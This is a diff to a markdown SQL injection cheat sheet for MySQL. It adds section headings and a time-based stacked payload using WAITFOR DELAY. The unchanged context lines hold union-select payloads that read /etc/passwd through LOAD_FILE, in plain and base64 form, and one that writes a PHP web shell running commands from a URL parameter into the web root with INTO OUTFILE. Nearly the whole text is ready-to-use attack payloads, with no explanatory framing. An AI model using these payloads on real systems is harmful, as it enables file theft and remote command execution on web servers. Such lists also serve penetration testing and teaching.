@@ -1,4 +1,5 @@
 ## MySQL
+### Union
 ```
 1+1
 hex(1)
@@ -11,4 +12,9 @@ hex(1)
 -1 union select "1",(LOAD_FILE("/etc/passwd")),"3"
 -1 union select "1",(TO_base64(LOAD_FILE("/etc/passwd"))),"3"
 -1 union select "1",(select "<?php exec($_GET['cmd']); ?>"), "3" INTO OUTFILE '/var/www/html/cmd.php'
+```
+
+### Stack and time-based
+```
+asdf'; WAITFOR DELAY '0:0:10'--
 ```
